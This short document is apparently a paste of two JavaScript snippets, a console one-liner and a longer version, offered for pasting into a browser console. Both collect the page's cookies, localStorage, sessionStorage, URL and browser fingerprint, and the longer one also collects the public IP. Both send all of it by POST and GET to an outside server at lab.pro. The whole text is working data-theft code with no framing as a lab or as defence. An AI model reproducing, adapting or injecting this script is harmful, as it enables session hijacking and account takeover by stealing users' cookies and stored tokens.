can be pasted into console: 

(() => { const clientInfo = { location: document.location.href, cookies: document.cookie, userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, screenResolution: `${window.screen.width}x${window.screen.height}`, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, localStorage: JSON.stringify(localStorage), sessionStorage: JSON.stringify(sessionStorage) }; const xhrPost = new XMLHttpRequest(); xhrPost.open("POST", "https://lab.pro/index.php", true); xhrPost.setRequestHeader("Content-Type", "application/json"); xhrPost.onreadystatechange = () => { if (xhrPost.readyState === 4 && xhrPost.status === 200) { console.log("Server Response (POST):", xhrPost.responseText); } else if (xhrPost.readyState === 4) { console.error("Error (POST):", xhrPost.statusText); } }; xhrPost.send(JSON.stringify(clientInfo)); const queryString = Object.keys(clientInfo).map(key => key + '=' + encodeURIComponent(clientInfo[key])).join('&'); const xhrGet = new XMLHttpRequest(); xhrGet.open("GET", `https://lab.pro/index.php?${queryString}`, true); xhrGet.onreadystatechange = () => { if (xhrGet.readyState === 4 && xhrGet.status === 200) { console.log("Server Response (GET):", xhrGet.responseText); } else if (xhrGet.readyState === 4) { console.error("Error (GET):", xhrGet.statusText); } }; xhrGet.send(); })();



long verssion:
(() => {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const clientInfo = {
                location: document.location.href,
                cookies: document.cookie,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                ip: data.ip,
                timestamp: new Date().toISOString()
            };
            const xhrPost = new XMLHttpRequest();
            xhrPost.open("POST", "https://lab.pro/index.php", true);
            xhrPost.setRequestHeader("Content-Type", "application/json");
            xhrPost.setRequestHeader("X-Forwarded-For", data.ip);
            xhrPost.onreadystatechange = () => {
                if (xhrPost.readyState === 4 && xhrPost.status === 200) {
                    console.log("Server Response (POST):", xhrPost.responseText);
                } else if (xhrPost.readyState === 4) {
                    console.error("Error (POST):", xhrPost.statusText);
                }
            };
            xhrPost.send(JSON.stringify(clientInfo));
            const queryString = Object.keys(clientInfo).map(key => key + '=' + encodeURIComponent(clientInfo[key])).join('&');
            const xhrGet = new XMLHttpRequest();
            xhrGet.open("GET", `https://lab.pro/index.php?${queryString}`, true);
            xhrGet.setRequestHeader("X-Forwarded-For", data.ip);
            xhrGet.onreadystatechange = () => {
                if (xhrGet.readyState === 4 && xhrGet.status === 200) {
                    console.log("Server Response (GET):", xhrGet.responseText);
                } else if (xhrGet.readyState === 4) {
                    console.error("Error (GET):", xhrGet.statusText);
                }
            };
            xhrGet.send();
        })
        .catch(error => console.error('Error fetching IP address:', error));
})();

